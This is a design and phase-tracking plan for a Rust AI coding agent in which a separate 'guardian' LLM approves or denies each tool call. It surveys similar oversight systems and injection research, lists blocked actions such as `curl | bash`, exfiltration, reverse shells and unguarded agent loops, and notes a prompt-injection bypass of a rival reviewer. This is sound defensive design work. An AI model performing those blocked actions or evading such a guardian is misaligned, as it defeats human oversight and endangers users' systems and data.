# Fontaine: Rust AI Agent Harness with Guardian-Agent Auto Mode — Master Plan & Phase Tracker

This file is the **tracking task**: phase status and progress live here, together with the
cross-cutting core every phase depends on (research findings, the permission-pipeline data flow,
the config schema, the guardian-tree direction, testing strategy, decisions, risk gates). The
build itself is split into **one plan per phase** under `tasks/phases/` — each phase plan owns
its design excerpt, numbered steps (ending in a docs step), files, tests, and definition of done.

## Overview

Fontaine is a terminal AI coding agent (Claude Code / Codex CLI class), written in Rust, that works
with **any model** the user configures (Anthropic, OpenAI, Gemini, and any OpenAI-compatible
endpoint — OpenRouter, Ollama, LM Studio, vLLM, LiteLLM). Its signature feature is **auto mode**:
instead of static allow/deny regex lists or an OS sandbox/docker wrapper, every non-trivially-safe
tool call is adjudicated by a **guardian agent** — a separate LLM session that uses its judgment,
grounded in the user's task intent and a prose trust/rule configuration, to decide
`allow | deny | escalate-to-human`. This is the architecture both majors shipped in 2026: Claude
Code's auto mode (a classifier model reviews each action, denies fail-closed, reasons are fed back
to the agent) and Codex CLI's `--approve-for-me` auto-review (a separate reviewer agent answers
approval requests). Neither judge runs locally or model-agnostically: both are provider-hosted
and provider-locked — Codex's reviewer *code* and policy are open-source in-tree
(`codex-rs/core/src/guardian/`), but the reviewer *model* is OpenAI-hosted and only runs on
OpenAI models; Claude Code's classifier is Anthropic-hosted — its rule lists and aggregate
FPR/FNR are published, but the fixed prompt template, per-decision reasoning, and local
execution are not. Fontaine makes the judge itself open, local,
model-agnostic, and prose-configurable, with per-verdict explanation.

User decisions already made:
- **Hybrid gate**: tools declare `read_only` risk metadata at registration, but the fast path is
  earned only by *Fontaine-enforced* workspace containment — not the label. Out-of-workspace reads
  are adjudicated/denied like writes (read ≠ safe), and MCP-declared `readOnlyHint` (the
  ToolAnnotations field, default false) never skips the
  guardian. No regex matching on arguments anywhere.
- **Design tie-breaker — copy Claude Code**: when in doubt, do as Claude Code does. At any analogous design point
  (permission modes, fail-closed behavior, escalation UX, config trust asymmetry, read-only skipping,
  deny-with-explanation) Fontaine copies Claude Code's documented semantics; a deviation from Claude Code must be
  recorded in `## Decisions` with a one-line reason.
- **Composite tools + Tier 0.5 shell pre-classifier**: dedicated first-party read tools (`ls`/`read`/`glob`/`grep`)
  that skip prompts, plus a deterministic (zero-LLM, non-regex) prefix/set-membership fast path for read-only shell
  commands — both mirroring Claude Code (see fontaine-tools and the pipeline diagram).
- **Parallel multi-agent management is a v1 requirement** (Claude Code-style subagents; see the Phase 5 plan)
  — supersedes the 2026-10-20 "no subagents in v1" decision.
- **TUI-first**: the ratatui app is the interactive-surface strategy; headless (`-p`) mode lands
  in Phase 1 on the same core as the CI/eval test driver (user decision 2026-10-21).
- **Reuse existing crates for the core wherever possible**: the harness is built on the **rig**
  family (rig-core / rig-agent / rig-memory / rig-tools / rig-rmcp / rig-cassette) for the model
  layer, agent runtime, tools, MCP, and session memory. Fontaine's own code concentrates on the
  differentiators: the guardian, the permission pipeline, config, and the TUI.

## Current State

Repo `/home/mad/fontaine` is on branch `start` (not `main`); its history so far is this plan (and
its split into per-phase plans), the five analysis docs, the LlamaFirewall deep-dive, and
review/fact-check passes on this branch. No
Rust code exists yet — the implementation is greenfield. `research/` holds six companion docs that are this plan's precedent and inputs:
`analysis-competitive-landscape.md` (market/permission-story survey),
`analysis-guardian-market.md`, `analysis-differentiation.md`,
`analysis-devils-advocate.md` (kill criteria), `analysis-strategic-verdict.md` (verdict and
"Required plan amendments" A1–A5, which this plan incorporates), and
`research-llamafirewall.md` (deep-dive on the nearest open prior art).

## Phase Tracker

Build order and phase content are owned by the phase plans; this table tracks status and links
out. Steps are numbered **within each phase plan**; cross-phase references use the form
"Phase N, step M" (pipeline steps in the data-flow diagram below are a separate numbering).
Documentation is a **per-phase deliverable**: every phase plan ends with a docs step, and
user-facing behavior (modes, config keys, verdict classes, tool semantics, CLI surfaces) ships in
the same phase as its doc update — a phase whose feature lands undocumented is not complete. All
product documentation lives under `docs/` (see §Documentation).

| Phase | Plan | Scope | Status | Exit milestone |
|-------|------|-------|--------|----------------|
| 0 — scaffold (eval first) | [phases/phase0_scaffold.md](phases/phase0_scaffold.md) | Cargo workspace, crate skeletons, CLI entry, tracing, CI, config loading; eval golden-dataset + runner skeleton; `docs/` tree started | not started | CI green; eval runner green against verdict fixtures with no guardian in the tree |
| 1 — model layer + headless | [phases/phase1_model_headless.md](phases/phase1_model_headless.md) | rig crates pinned; config → provider mapping; streaming spike; `fontaine -p`; provider docs | not started | full tool round-trip headless via `-p` (Phase-5-draft denial semantics) |
| 2 — agent runtime & tools | [phases/phase2_runtime_tools.md](phases/phase2_runtime_tools.md) | RiskClass registry, GuardedTool (gate stubbed), rig-tools built-ins + read tools + webfetch, scope validator, shell hardening; rig-agent session orchestration; `docs/tools.md` | not started | agent runs tools end-to-end headless through wrapped registry; choke-point test green |
| 3 — pipeline & manual TUI | [phases/phase3_pipeline_tui.md](phases/phase3_pipeline_tui.md) | PermissionPipeline (manual/acceptEdits/plan/dontAsk; deterministic floor; Tier-0.5; audit log); ratatui TUI; `docs/permissions.md` + pipeline diagram | not started | **usable Claude-Code-like agent with manual approvals** |
| 4 — guardian + scorecard | [phases/phase4_guardian.md](phases/phase4_guardian.md) | fontaine-guardian; `auto` wired into pipeline; denial UX; live evals; **published scorecard**; `docs/guardian.md` + `docs/evals.md` | not started | shipped default flips `manual` → `auto`; scorecard public with the release |
| 5 — extensibility | [phases/phase5_extensibility.md](phases/phase5_extensibility.md) | MCP; session persistence; parallel subagents (v1) + budgets + agents panel; `docs/mcp.md` + `docs/agents.md`; sandbox/sandboxing.md = **roadmap slot** | not started | gated background subagents live in one session |
| 6 — guardian hardening | [phases/phase6_hardening.md](phases/phase6_hardening.md) | tool-result scanner (PromptGuard 2 ONNX default, BYO interface, cheap-LLM fallback); scanner docs | not started | scanning demonstrable behind config, license caveat surfaced |

### Progress log

Append one dated line as each phase's definition of done is met (local commits referencing the
phase plan are the work trail).

- (none yet)

## Design — cross-cutting core

### Workspace layout

Built **on rig**: Fontaine crates are the guardian, the permission pipeline, config, and surfaces.
The model layer, agent runtime, memory/compaction, base tools, and MCP come from rig crates.
Per the micromegas convention, the Cargo workspace lives at `rust/Cargo.toml` and **every crate
sits directly under `rust/`** — the repo root holds only `rust/`, `evals/`, `docs/`, `tasks/`,
`research/`.

```
fontaine/
├── rust/
│   ├── Cargo.toml              # workspace root (`[workspace] members = ["*", …]`, resolver = "2",
│   │                           #   workspace.package block); rig crates pinned to exact versions
│   ├── fontaine/               # thin bin crate: CLI (clap), wires core+tui, `-p` headless from Phase 1
│   ├── fontaine-core/          # session orchestration on rig-agent (AgentRun, hooks),
│   │                           #   permission pipeline, config, FONTAINE.md loading
│   ├── fontaine-tools/         # risk metadata registry + GuardedTool wrapper around
│   │                           #   rig-core Tool; rig-tools built-ins re-exposed with risk
│   │                           #   classes; workspace-scope/symlink validation; bash hardening
│   ├── fontaine-guardian/      # the guardian agent: verdict protocol (rig extractor),
│   │                           #   prompt builder, rules config, caching, fail-closed logic
│   ├── fontaine-agents/        # parallel subagent orchestration on rig-agent: spawn/list/
│   │                           #   interrupt, per-type tool registries, budgets (v1)
│   ├── fontaine-mcp/           # rig-rmcp wiring: MCP servers from config, tools registered
│   │                           #   as RiskClass::Arbitrary, annotations → guardian hints
│   └── fontaine-tui/           # ratatui app: chat, approval prompts, denial/retry UI, modes
├── evals/                      # Phase-0 golden dataset + guardian scorecard runner
├── docs/                       # all product docs — one topic per page, website-ready (see §Documentation)
├── tasks/                      # this master plan + phases/ (one plan per phase)
└── research/                   # six analysis/research companion docs
```

`fontaine-llm` from the first draft is **gone** — rig-core's provider layer (20+ providers,
streaming, OpenAI-compatible custom endpoints for OpenRouter/LM Studio/vLLM/LiteLLM) replaces it
entirely.

Phase-owned design sections live in the phase plans: model layer (Phase 1), tools/risk registry/
GuardedTool (Phase 2), permission modes + base TUI (Phase 3), the guardian agent (Phase 4),
parallel agents + agents panel (Phase 5), result scanning (Phase 6).

### Core data flow

```
 user ──▶ TUI ──▶ rig-agent runtime, orchestrated by fontaine-core
                      │  (AgentBuilder + AgentRun state machine; rig streams model events)
                      ▼
               ToolCall { name, args }
                      │
                      ▼  (every registered tool is a GuardedTool wrapper)
         PermissionPipeline (fontaine-core, inside GuardedTool::call)
           1. registry.lookup(name) → RiskClass
           2. Deterministic floor — evaluated BEFORE the mode branches, in EVERY mode (no mode,
              flag, or verdict reaches past it; order: deny → ask → critical-path):
              `[permissions] deny` rule match → Deny; `[permissions] ask` rule match → force the
              human prompt (even in `auto`; a match in `dontAsk` denies); critical-path structural
              check → block destructive ops on the never-auto-approved paths (filesystem root `/`,
              top-level dirs, home, the working directory and its parents, /etc, $HOME, `.git`,
              dotfiles — Claude Code's critical-path list). All structured matching (tool name +
              risk metadata + path containment), never regex on raw args.
           3. mode == plan?  → no edit ever executes: ReadOnly-in-scope and Tier-0.5-eligible
              calls proceed (steps 4–5); everything else reaches the terminal plan-mode branch 9.
              Structurally blocked = WorkspaceWrite / edit-class only; write-capable/unparsed
              shell is NOT edit-class — it is adjudicated at branch 9 with the other
              consequential calls
           4. RiskClass::ReadOnly && args within workspace scope? → Allow (no guardian)
              (scope check enforced by Fontaine's wrapper/scope validator, first-party only;
               MCP-declared readOnlyHint does not qualify — such tools register as Arbitrary)
           5. Tier 0.5 — deterministic shell pre-classifier (zero-LLM), `shell` calls only:
              lexically parsed (shlex/AST — NOT regex) into ONE simple command (no pipelines,
              `;`/`&&` chaining, redirections, command substitution, backgrounding, globs —
              anything exotic falls through) AND argv[0]+subcommand ∈ curated read-only set
              (`ls`, `pwd`, `wc`, `file`, `git status|log|diff|show`, `rg`/`grep`,
              `cat`/`head`/`tail`) AND every remaining token is either a path argument passing
              the step-4 scope validator (symlink-resolved; absolute / out-of-workspace paths
              never qualify) or a flag on a per-command read-only flag allowlist — any flag not
              explicitly allowlisted for that command, any glob/`~`/wildcard token, or any
              unparsed construct falls through to the guardian; values of file-opening flags
              (`--files-from`, `-f`, `-m`, etc.) are themselves treated as path arguments and
              validated (mirrors Claude Code's documented per-command flag handling)
              → Allow, with an audit-log entry (no guardian)
           6. mode == manual/acceptEdits → human prompt (acceptEdits: auto-allow edits in workdir)
           7. mode == auto → Guardian::adjudicate(request) ──▶ Verdict
           8. mode == dontAsk → anything not pre-allowed is Denied
           9. mode == plan (not allowed by steps 4–5): WorkspaceWrite / edit-class → BLOCKED
              outright (structural; no verdict or escalation can override the edit block while
              plan mode is on); every other consequential call — write-capable or unparsed shell,
              webfetch, out-of-scope reads, ALL MCP calls (anything non-shell `Arbitrary`) →
              Guardian::adjudicate as in auto (CC parity: plan mode routes consequential calls
              through the classifier by default; never edits). Until the guardian ships (Phase 4),
              these step-9 calls fall through to the human prompt.
                      │
         Allow ──▶ inner rig Tool executes ──▶ result appended to conversation (rig-memory)
         Deny  ──▶ tool_result = "Denied by guardian: [reason]"; agent sees it and adapts
         Escalate ──▶ human prompt (with guardian's explanation shown)

 (the `agent` tool call that spawns a subagent is an ordinary `Arbitrary`-class pipeline request —
  gated at steps 6–9 like any other; every tool call the subagent then makes re-enters this same
  pipeline)
```

### Composite guardian (the guardian tree)

Design direction (not a v1 build item — scope discipline below): the permission pipeline is **already
a depth-ordered tree of guardrooms** — deterministic floor (`deny`/`ask`/critical-path) → Tier 0.5 shell
pre-classifier → [candidate screen tier: typed-decision model, Jev-class — see the Phase 4 plan] →
LLM guardian → human. **Composition rule: strictest verdict wins** (deny > escalate > allow); any tier
disagreement, timeout, or error is fail-closed; every tier's verdict + confidence is logged to the audit
trail (per-layer attribution).

- **Branching by domain** (the Jev-Guard "policy tree" precedent, arXiv:2610.18326): the prose rule sets
  + typed questions specialize per risk domain (filesystem / shell / network / destructive-class /
  agent-spawn); a request routes to its domain branch(es). The natural generalization of the single
  `guardian_prompt.md` → per-domain rule subtrees, still versioned, still user-inspectable, still
  diffable — preserves the differentiator (compete-with-Codex: our tree is open prose + local options,
  not a closed vendor policy).
- **Escalation economics**: cheap deterministic / decision-model tiers resolve the head of the
  distribution; the expensive generative adjudicator sees only the uncertain tail — Jev-Guard's measured
  4.80 s → 1.33 s harness review time is the motivating datapoint; Claude Code's own Tier1/Tier2/Tier3
  classifier ladder is the CC-parity anchor (tie-breaker).
- **One tree serves the whole session agent tree**: because the guardian is stateless-per-request, a
  single guardian tree gates all subagents (no per-subagent guardian instances; `[agents]` budgets count
  the shared tiers).
- **Scope discipline**: v1 ships the deterministic tiers + a single LLM guardian (+ optional PG2 result
  scanner) — already a 3-deep tree. The typed-decision screen tier and per-domain policy subtrees are a
  **roadmap slot (Phase 6+)**, gated by: each tier must score on the golden set before insertion, and the
  published scorecard must report per-tier precision/recall — never stack unbenchmarked guardians
  (composite ≠ safety by committee). No new config keys for v1 (roadmap-only; `[guardian] profile`
  interacts — minimal narrows the ruleset *within* the tree, it never removes the tree).

### Config (`~/.config/fontaine/config.toml` + project `.fontaine/settings.toml`)

```toml
[model]
provider = "anthropic"            # or "openai", "openai-compatible", "gemini"
model = "claude-sonnet-4-6"
base_url = ""                     # for openai-compatible: OpenRouter/Ollama/LM Studio URL

[guardian]
model = "claude-haiku-5-5"        # optional; unset ⇒ top-ranked validated guardian model available on this provider (see the Phase 4 plan)
profile = "full"                  # "full" | "minimal" — minimal is the container-mode narrowing (never off):
                                  #   escape-class ruleset + reduced context on a cheap validated model; requires
                                  #   Fontaine-verified containment; loosening knob ⇒ user-scope only, never
                                  #   project-settable; see the Phase 4 plan
timeout_secs = 30
confidence_threshold = 0.7
cache = true
scan_tool_results = false

[permissions]
default_mode = "auto"             # shipped default (Claude Code parity); during the Phase-3
                                  #   interim the default is `manual` — no auto without a
                                  #   guardian until Phase 4 wires it in
deny = []                         # deterministic deny rules: tool name + risk metadata +
                                  #   workspace/path-containment predicates (structured matching,
                                  #   NOT regex on raw arg strings — honors the 2026-10-20
                                  #   no-regex decision); evaluated BEFORE the mode branches in
                                  #   every mode; blocks before the classifier and can't be
                                  #   overridden — Claude Code parity
ask = []                          # deterministic always-prompt rules (CC parity: content-scoped
                                  #   ask rules are evaluated before the classifier and always
                                  #   force a permission prompt, even in auto; in `dontAsk` a
                                  #   match denies); same structured matching as deny; user-scope
                                  #   AND project-scope may ADD ask rules (asking is tightening),
                                  #   never remove; evaluated right after deny, before Tier 0.5,
                                  #   in every mode

[auto_mode]                        # prose lists; the loosening slots (allow/environment) are
environment = ["$defaults",        #   user-scope file only; project files may add to
                                   #   soft_deny/hard_deny but NEVER to allow/environment
  "Source control: github.com/myorg"]
allow       = ["$defaults", "Deploying to staging namespace is allowed: resets nightly"]
soft_deny   = ["$defaults"]
hard_deny   = ["$defaults", "Never send repo contents to third-party code-review APIs"]

[agents]
max_parallel = 4                  # concurrent subagents (v1 requirement, Claude Code-style)
subagent_token_budget = 200000    # per-subagent cap; hitting it stops that subagent, result
                                  #   returned as partial, pending escalation/approval prompts
                                  #   cancelled as denied — fan-out can't silently multiply cost
subagent_cost_budget_usd = 2.0    # per-subagent spend cap (same enforcement)
# session_token_budget / session_cost_budget_usd   # root-of-tree totals, default unset; when set,
                                  #   every agent in the tree debits them (hard fan-out ceiling);
                                  #   unset ⇒ tree exposure is structurally bounded by max_parallel
                                  #   (tree-wide) × per-subagent caps × 3-layer depth

[agents.types]                    # per-agent-type policy: model + restricted toolset + mode
                                  #   (default `mode = "inherit"`; an EXPLICIT per-type `mode`
                                  #   may only be `manual` or `dontAsk` — never looser than
                                  #   inherited, session ladder dontAsk < manual < acceptEdits <
                                  #   auto; `plan` is a session-root interactive posture, not a
                                  #   child mode; plan/acceptEdits/auto are reachable for a child
                                  #   only via `inherit` from a parent already there); a type's
                                  #   toolset is always a subset of the parent's
  explore = { model = "$guardian_default", tools = ["ls", "read", "glob", "grep"] }
  worker  = { model = "$main", tools = ["ls", "read", "glob", "grep", "edit", "write", "shell"] }

[shell_preclassifier]
allow_extra = []                  # user extensions to the curated read-only command set — one
                                  #   mode-agnostic list, applying in every mode (the pre-classifier
                                  #   runs before the mode branches); Fontaine
                                  #   never auto-extends it from observed usage
```

Rule-precedence semantics and the `$defaults` splice marker are adopted directly from Claude
Code's auto-mode config (proven design). Two more splice markers appear in `[agents.types]`:
`$main` = the session model (`[model]`), `$guardian_default` = the top-ranked validated guardian
model available on the configured provider (per Decisions). **Trust asymmetry**: project-level settings may only
*tighten* (add hard/soft denies and `ask` rules); only user-level config may loosen. Mirroring Claude Code's
documented semantics (where `defaultMode: "auto"` and `"bypassPermissions"` are ignored in
project settings — Fontaine ships no `bypass` mode at all), **project-level settings cannot set
`[permissions] default_mode` to `auto` — that is user-scope only**; a checked-in repo must not be able to disarm its
own guardian. Tier-0.5 `[shell_preclassifier]` extensions are loosening, so they follow the same
rule: user-scope config only, never project-scope. `[guardian] profile` follows it too — a loosening
knob (minimal vs full), user-scope only, and no value of it disables the guardian.

## Research Findings (prior art this design is grounded in)

### Claude Code auto mode (the feature being replicated, and its exact semantics)

From the official docs (code.claude.com/docs/en/permission-modes and /auto-mode-config):

- **Six permission modes**: `default` (manual, prompt on everything state-changing), `acceptEdits`
  (auto-approve edits in workdir), `plan` (read/explore only, then approve a plan), `auto`
  (classifier reviews actions), `dontAsk` (pre-approved tools only; anything that would prompt is
  denied — for CI), `bypassPermissions` (everything runs; containers only). Shift+Tab cycles modes.
- **Auto mode = a second model ("the classifier") reviews each action before it runs.** It is now
  the default mode for interactive sessions (v2.1.283+). Anthropic reports it caught **89% of
  dangerous commands vs 13.6% for human reviewers** at prompts.
- **What the classifier sees**: user messages, pending tool calls (not read-only lookups), and
  CLAUDE.md/project-instruction content. It does **not** see raw tool outputs — limiting what
  injected content can argue to the classifier directly. A separate server-side probe scans
  incoming tool *results* for suspicious content before the agent reads them.
- **Decision order**: explicit `deny` rules → explicit `ask` rules (always prompt, even in auto) →
  read-only skip → critical-path removals (`rm -rf /`, `~`) never auto-approved → classifier.
- **Fail-closed**: if the classifier request fails, times out, or returns no parseable verdict, the
  action is **denied**, never run unreviewed.
- **Denial UX**: the agent receives the denial reason (e.g. `[Data Exfiltration]`, `[Production
  Deploy]`) and adapts; denials are recorded in a "Recently denied" list where the user can mark
  actions for retry; repeated denials prompt the user to teach the classifier about their
  environment.
- **Classifier config is prose, not regex**: four lists — `environment` (trusted infra: repos,
  buckets, internal domains, registries, sensitive locations), `hard_deny` (unconditional),
  `soft_deny` (destructive; clearable by explicit, specific user intent), `allow` (exceptions to
  soft denies). Precedence: hard_deny > soft_deny > allow > explicit user intent clears remaining
  soft blocks. General requests ("clean up the repo") do **not** count as intent; specific ones
  ("force-push this branch") do. User-level settings only — project-level files can't inject
  allow rules (a checked-in repo must not be able to loosen its own guardian).
- **The classifier model is separately configurable** (`CLAUDE_CODE_AUTO_MODE_MODEL`, default
  Sonnet 5) — the guardian can be a cheaper/faster model than the main agent.
- Default blocked behaviors worth seeding our guardian rules with: `curl | bash`, exfiltration to
  unrecognized endpoints, prod deploys/migrations, force push, `git reset --hard`/`clean -fd` of
  pre-session state, IAM grants, destroying files that existed before the session, secrets into
  commits/PRs/logs, tunnels/reverse shells, launching other unguarded agent loops
  (`--dangerously-skip-permissions`), disabling safety flags (`--insecure`), commenting out
  security-guarding tests, `git remote set-url` to unnamed third parties, merging unreviewed PRs /
  self-approving own PR / disabling CI.
- **Trust boundary**: only the working directory and git remotes configured at session start are
  trusted; remotes added mid-session are not.

### Codex CLI (codex-rs) — Rust architecture precedent

- Large Cargo workspace (60+ crates): `core` (agent loop, `ToolOrchestrator`), `tui` (ratatui),
  `exec` (headless), provider crates, sandbox crates.
- `ToolOrchestrator` pipeline: **approval check → sandbox selection → execute → retry-with-
  escalation on denial**. Config in `~/.codex/config.toml` with `approval_policy` ×
  `sandbox_mode` as orthogonal axes. Fontaine mirrors this shape but replaces the
  sandbox/approval-policy axes with **permission mode × guardian**.
- Confirms the pattern: headless and TUI are thin surfaces over a shared `core` crate.
- **Codex ships its own LLM adjudicator too**: codex-rs main source has `GuardianReviewContext` +
  `strict_auto_review` in `core/src/tools/orchestrator.rs`, plus `ext/guardian-reviewer` and
  `ext/guardian-v2` crates; the `--approve-for-me` flag (v0.147.0, Aug 2026) replaces manual
  approval with a separate reviewer agent at the sandbox boundary. The reviewer code and policy
  are open-source in-tree (`codex-rs/core/src/guardian/` — review.rs/prompt.rs/decision.rs +
  policy.md); what is closed is the reviewer **model** — OpenAI-hosted, never local, and it only
  runs on OpenAI models. PromptArmor demonstrated bypasses of the auto-review agent
  (approving malicious npm installs via indirect prompt injection) — the pattern is validated by
  both majors but breakable, which is why Fontaine's guardian ships with a public eval scorecard
  (see Testing Strategy).

### Goose (Block / AAIF) — model-agnostic Rust precedent

- Rust workspace, 15+ LLM providers behind its own provider trait (not a third-party framework),
  MCP extensions via the Rust SDK, `reqwest` + `rustls`, `goose serve` server + CLI + desktop surfaces.
- Confirms: the older production harnesses (codex-rs, goose) each hand-rolled a
  thin provider layer over `reqwest` — but they predate rig's 0.4x decomposition into harness-grade
  crates (agent runtime with hooks, memory/compaction, coding tools, MCP bridge, cassette replay).
  Fontaine reuses rig for that layer instead of hand-rolling it (see Trade-offs); goose remains the
  reference for config UX and multi-surface shape.

### Guardian-agent research

- **GuardAgent** (Xiang et al., arXiv:2406.09187, ICML 2025): first "guard agent" paper — an LLM
  guards a target agent by checking actions against safety guard requests; 98%/83% guardrail
  accuracy on two benchmarks. Validates the core concept.
- **Dual-LLM pattern** (Willison 2023) / **CaMeL** (DeepMind, arXiv:2503.18813): privileged LLM
  plans; quarantined LLM touches untrusted data; controller enforces that tainted content never
  flows back unfiltered. Key insight adopted here: **the guardian is the quarantined-side
  component** — its exposure to untrusted material is the tool args echoing file contents (tool
  *results* go to the separate result scanner and are never guardian input), so it must have **no
  tools of its own**, must emit **structured output only** (a fixed
  verdict schema can't carry an injection forward), and its verdicts are validated by the
  controller (regular code) before acting.
- **AgentDojo** (Debenedetti, Zhang, Balunović, Beurer-Kellner, Fischer & Tramèr, ETH Zürich;
  arXiv:2406.13352, NeurIPS 2024 Datasets & Benchmarks) and follow-ups: prompt-injection detectors transfer poorly between
  benchmarks; specialized small detectors (e.g. Prompt Guard 2) catch ~0–2% of realistic agent
  injections **beyond explicit jailbreak phrasing** — a cheap first layer, not a judge; on
  AgentDojo's suite PG2 blocks the majority of ASR (see below). Conclusion: a **general reasoning model as guardian with task context** is currently
  the strongest practical approach — and the guardian itself must be treated as an attack surface
  (hence: no tools, structured output, content clearly delimited as untrusted data, fail-closed).
- **OPA for agent tool calling**: policy-as-data approach exists but is rule-based; orthogonal —
  our prose `hard_deny`/`allow` lists fill that niche inside the guardian prompt rather than as an
  external policy engine.
- **Typed decision models as guardrail judges (2026)**: JEV as a judge for agent-trace security
  (arXiv:2609.34862, Wang & Gao, Sep 28 2026) vs four generative judges over 5,219 trajectories —
  benchmark-averaged positive-class F1 77.8 vs 74.1 (best generative: GLM-5.2); leads ATBench500 /
  MCPHunt, trails R-Judge / TraceSafe; median latency 0.99 s, ~$0.000195/valid judgment; authors'
  own framing: "an economical screening signal, with trade-offs in precision and recall" — and
  Jev-Guard safety classification + routing over an editable policy tree (arXiv:2610.18326, Hu et
  al., HKUST/CUHK-Shenzhen et al., Oct 13 2026): over 7,033 cases 93.72% safety accuracy at 58 ms
  mean latency, 93.10% hierarchical routing accuracy, full pipeline ~240 ms; integrated into the
  Hermes harness, its permission gate cut mean review time per task 4.80 s → 1.33 s vs an SFT-LLM
  judge, zero policy violations for either guard. Fast calibrated bounded verdicts beat generative
  judges on average F1 and 4–6× on review latency; the framing that fits our architecture is
  **decision-model SCREEN tier + LLM adjudicator, not replacement**. Caveats cited honestly: Jev is
  hosted and closed-weights; arXiv:2610.04985 ("Hidden Risks of Jev") demonstrates membership /
  internal-knowledge inference against its outputs — a typed decision model is still an attack
  surface, which supports fail-closed + audit + BYO-local posture.

### LlamaFirewall (Meta) — nearest open prior art (full deep-dive: `research-llamafirewall.md`)

- **Positioning**: LlamaFirewall (arXiv:2505.03574, May 2025) is an open (MIT), in-process Python
  guardrail *framework*: a policy engine orchestrating scanners over agent messages/traces —
  PromptGuard 2 (injection classifier), AlignmentCheck (LLM chain-of-thought auditor), CodeShield
  (static analysis), regex/custom scanners. It is the strongest open prior art and the benchmark
  baseline we will be compared against — but it is a *detector library for agent builders*, not a
  *permission engine inside a harness*. Commit activity since ~March 2026 is predominantly bot
  chores (`research-llamafirewall.md` §6 — last functional change Jan 2026, last commit 2026-08-18);
  Meta has **not** declared the project in maintenance mode (no such statement exists) — the
  slow-moving read on classifier updates rests on that commit history, not a Meta declaration.
- **Monitoring vs authorization**: AlignmentCheck answers "has this agent drifted from the user's
  goal?" — a trace **drift monitor** (labeled experimental; defaults to a Together-hosted model).
  Fontaine's guardian answers "may this specific action run, under these rules, in this
  environment?" — a pre-execution **authorization gate** with Allow/Deny/Escalate verdicts, prose
  intent rules, and deny-reason feedback. Different seat; the public will conflate them, so the
  distinction must stay crisp in docs.
- **AgentDojo baseline for our eval**: report Fontaine guardian results in AgentDojo-comparable
  terms (ASR × utility) against their published numbers — no-defense .176 / PromptGuard 2 .075 /
  AlignmentCheck .029 / combined .0175 — as the bar to beat. These are the LlamaFirewall paper's
  own runs; the AgentDojo paper itself (arXiv:2406.13352, NeurIPS 2024) never mentions LlamaFirewall
  or AlignmentCheck, and its published tables report **benign utility, utility-under-attack, and
  targeted/untargeted ASR separately (§3.4)** from live agent runs, while the LlamaFirewall paper
  offline-rescores static leaderboard traces — the two papers' numbers are not directly comparable.
- **PromptGuard 2 as the tool-result scanner** (default — user decision 2026-10-21): adopt as the
  default for the result-scanning slot (recall @ 1% FPR **97.5% (English)** per both the HF model
  card and the paper's §4.1 table; EN AUC differs — .998 on the card vs .98 in the paper's table;
  0.995 multilingual AUC; 19–92ms) via ONNX Runtime
  (`ort` crate), with the cheap-LLM pass as the fallback / bring-your-own option. Caveat: the
  PromptGuard 2 HF repos are **gated downloads** (`gated: "manual"` — license acceptance required)
  and the weights carry the **Llama 4 Community License**, which **permits commercial use**
  (royalty-free, conditional; extra restrictions only above 700M monthly active users; AUP +
  "Built with Llama" notice). Llama Guard 4 12B is under the same license (not Apache-2.0) and
  too heavy for hot-path scanning anyway. Community mirrors and ONNX ports exist but do not
  change the license; the air-gapped / license-clean story is the BYO-scanner interface.
- **Attribution**: the LlamaFirewall code and its examples are MIT-licensed (examples carry MIT
  headers; no separate license file in `Examples/`; the enclosing PurpleLlama repo carries the
  Llama 3.2 Community License for its model weights, and GitHub reports the repo license as
  NOASSERTION/"Other"); their AlignmentCheck prompts (paper Appendix
  C.6, CC BY 4.0) are reusable, attributed prior art for `guardian_prompt.md`. Cite their
  anti-proprietary-guardrails argument — provider-embedded safety offers "limited visibility,
  auditability, and customizability" (the paper's Introduction §1; §2.4, "Open-Source vs.
  Proprietary Approaches", says "limited visibility and extensibility") — it is our pitch, from
  Meta. Do **not** take a runtime
  dependency on the `llamafirewall` Python package; depend on its models and numbers, not its
  framework.

### Ecosystem / dependencies — reuse-first (user requirement)

- **rig** (MIT, v0.45.0, Oct 2026, 0xPlaygrounds) — the Rust LLM framework, now split into exactly
  the crates a harness needs; this is the core reuse target:
  - `rig-core`: provider-neutral messages/completion/tool contracts; **20+ providers** (OpenAI,
    Anthropic, Gemini, Ollama, Bedrock, Vertex, OpenAI-compatible custom endpoints…) behind one
    interface; streaming; a `structured_output` module implementing the **synthetic output tool**
    pattern (works on every tool-capable model — exactly the guardian-verdict fallback we need);
    `catalog` of model facts (limits, pricing, caching); `redact` (secret finding/redaction in
    text the harness logs or displays — reuse for transcripts and guardian inputs); `test_utils`
    for deterministic completion-model tests.
  - `rig-agent`: the agent runtime — `AgentBuilder`, `AgentHook`/`HookContext` (typed hooks around
    agent turns — a candidate guardian injection point), `AgentRun` (serializable, sans-I/O state
    machine for model turns + tool recovery + history — session persistence for free), `extractor`
    (typed extraction through a submit-output tool with configurable retries — reuse verbatim for
    parsing guardian `Verdict`s), tool registry with ordered registrations.
  - `rig-memory`: context windows, **compaction**, saving/resuming and time-travel
    (`as_of`/restore).
  - `rig-tools`: ready coding tools (read, write, edit, search, shell) any rig agent can use.
  - `rig-rmcp`: MCP integration for rig agents (native), bridging rmcp into the rig tool registry.
  - `rig-cassette`: effect recording/replay and checkpoints — deterministic integration tests of
    full agent runs without live APIs.
  - Caveat: rig is pre-1.0 with breaking changes each release; pin exact versions workspace-wide
    (`rig-core = "=0.45.0"` style) and upgrade deliberately. The bare `rig` crate is a facade that
    is `no_run` in the workspace (never compiled or CI-tested) — depend on `rig-core` directly.
    rig also ships its own Bevy-plugin coding
    agent (`rig-harness`, `rig-tui`) — we do **not** build on that; Fontaine keeps its own ratatui
    TUI and guardian-first architecture.
- **rmcp** — official MCP Rust SDK, v3.6.0 (Oct 2026), tokio-based, spec 2026-07-28; reached
  through `rig-rmcp` so third-party tools plug into the same registry and guardian gate.
- **ratatui + crossterm** — the standard Rust TUI stack (used by codex-rs; also demonstrated with
  rig in JetBrains' "Rust AI in Practice" session — a coding agent built on rig + ratatui).
- **tokio, serde, clap, tracing, toml** — glue. **wiremock** (dev-dependency) — used by the
  per-provider smoke tests and the fail-closed 500 test (see Testing Strategy).

## Files to Modify

All new. Key files: workspace `rust/Cargo.toml` (members = ["*", …], resolver 2,
workspace.package block; rig crates pinned);
`rust/fontaine-core/src/{lib,models,permissions,config,session,hooks}.rs`;
`rust/fontaine-tools/src/{lib,guarded,risk,scope,webfetch,shell_hardening,preclassify}.rs`;
`rust/fontaine-guardian/src/{lib,verdict,prompt_builder,rules,cache,scanner}.rs` +
`rust/fontaine-guardian/prompts/guardian_prompt.md`;
